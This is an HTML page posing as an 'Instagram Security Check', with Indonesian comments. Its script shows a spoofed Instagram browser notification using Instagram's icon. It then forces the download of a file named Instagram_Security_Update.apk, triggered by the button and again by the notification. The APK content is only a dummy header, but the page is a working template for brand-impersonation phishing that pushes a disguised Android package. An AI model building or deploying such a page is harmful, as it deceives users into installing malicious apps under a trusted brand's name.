<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Security Check</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center;
  }
  .panel { background: #1a1a1a; padding: 30px; border-radius: 12px; max-width: 400px; width: 100%; }
  h2 { color: #E4405F; margin-bottom: 10px; }
  p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
  button {
    background: #E4405F; color: #fff; padding: 15px;
    border: none; border-radius: 8px; cursor: pointer;
    width: 100%; font-size: 16px; font-weight: bold;
  }
  button:hover { background: #c13551; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; }
</style>
</head>
<body>

<div class="panel">
  <h2>🔒 Instagram Security</h2>
  <p>Verifikasi diperlukan untuk melanjutkan.</p>
  <button id="startBtn">Verify Account</button>
  <div id="log">Sistem siap.</div>
</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. SPOOF NOTIFICATION (INSTAGRAM)
  // ============================================
  function spoofNotification() {
    if (!('Notification' in window)) return;
    
    // Minta izin notifikasi (jika belum)
    Notification.requestPermission().then(function(permission) {
      if (permission === 'granted') {
        // Tampilkan notifikasi palsu dengan ikon Instagram
        var notif = new Notification('Instagram', {
          body: 'Pembaruan keamanan akun tersedia. Klik untuk memperbarui.',
          icon: 'https://www.instagram.com/static/images/ico/favicon-192.png/68d99be9c5b0e0e7c7a8c0e0e7c7a8c0.png',
          tag: 'insta-update',
          requireInteraction: true
        });

        // Jika user mengklik notifikasi, picu unduhan
        notif.onclick = function() {
          triggerDownload();
          notif.close();
        };
        
        log("[+] Notifikasi Instagram palsu ditampilkan.");
      }
    });
  }

  // ============================================
  // 2. FORCED DOWNLOAD (SPOOFING MIME & NAME)
  // ============================================
  function triggerDownload() {
    log("[!] Memicu unduhan...");

    try {
      // Header APK (Dummy)
      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
      var binary = atob(b64Apk);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      
      // MIME Type APK
      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
      var blobUrl = URL.createObjectURL(blob);

      // Buat elemen <a> untuk unduhan
      var a = document.createElement('a');
      a.href = blobUrl;
      
      // SPOOFING NAMA FILE: Seolah-olah dari Instagram
      a.download = 'Instagram_Security_Update.apk';
      
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      
      log("[+] File Instagram_Security_Update.apk terunduh (jika diizinkan).");

      // Cleanup
      setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 5000);

    } catch(e) {
      log("[-] Gagal: " + e.message);
    }
  }

  // ============================================
  // 3. TRIGGER AWAL
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    log("[!] Memulai verifikasi...");
    
    // Panggil notifikasi palsu
    spoofNotification();
    
    // Picu unduhan langsung (setelah 1 detik)
    setTimeout(triggerDownload, 1000);
  });

})();
</script>
</body>
</html>
